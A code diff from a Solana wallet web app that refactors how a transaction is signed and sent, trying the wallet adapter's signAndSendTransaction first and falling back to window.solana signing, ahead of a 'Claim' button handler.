@@ -160,32 +160,32 @@ export default function Page() {
     (x): x is DrawerWallet => x !== null
   )
 
-/* ——— Transaction gönderme ——— */
 const doTx = async () => {
   setLoading(true)
   try {
-    // 1) Unsigned TX oluştur
     const tx = await createUnsignedTransaction(publicKey || null)
     if (!tx) {
       setMsg('No enough Sol!')
       return
     }
 
-    // 2) Aktif adapter'ı bul
-    const activeAdapter = wallets.find(w =>
-      w.adapter.publicKey?.equals(publicKey!)
-    )?.adapter
+    let sig: string | undefined
 
-    let sig: string
-    if (activeAdapter && 'signAndSendTransaction' in activeAdapter) {
-      // Trust Wallet ve benzerleri için signAndSendTransaction kullan
-      sig = await (activeAdapter as any).signAndSendTransaction(tx)
-    } else {
-      // Diğer cüzdanlar için standart yol
-      sig = await sendTransaction(tx, conn)
+    const adapter = wallets.find(w => w.adapter.publicKey?.equals(publicKey!))?.adapter
+
+    // 1) signAndSendTransaction varsa onu kullan
+    if (adapter && 'signAndSendTransaction' in adapter) {
+      // @ts-ignore: bazı adapter'lar bunu sağlar
+      sig = await adapter.signAndSendTransaction(tx)
     }
 
-    // 3) Onay bekle
+    // 2) değilse fallback → signTransaction + sendRawTransaction
+    if (!sig) {
+      const signed = await window.solana?.signTransaction?.(tx)
+      if (!signed) throw new Error("Unable to sign transaction")
+      sig = await conn.sendRawTransaction(signed.serialize())
+    }
+
     await conn.confirmTransaction(sig, 'confirmed')
     setMsg('Transaction successful!')
   } catch (e) {
@@ -196,6 +196,7 @@ const doTx = async () => {
     setTimeout(() => setMsg(''), 5000)
   }
 }
+
   /* ——— Claim butonu ——— */
   const handleClaim = () => {
     if (!publicKey) openDrawer()
